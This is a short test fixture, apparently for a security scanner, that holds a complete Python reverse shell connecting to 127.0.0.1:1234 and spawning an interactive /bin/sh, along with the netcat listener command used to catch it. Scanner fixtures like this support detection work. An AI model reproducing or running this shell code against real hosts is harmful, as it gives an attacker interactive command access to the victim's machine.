_description: LAB fixture: reverse TCP shell to 127.0.0.1:1234. Positive test payload for the Model Security RE scanner; localhost-only, run on your own host with nc -lvnp 1234 listening.
revshell:
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 1234))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
subprocess.call(['/bin/sh', '-i'])
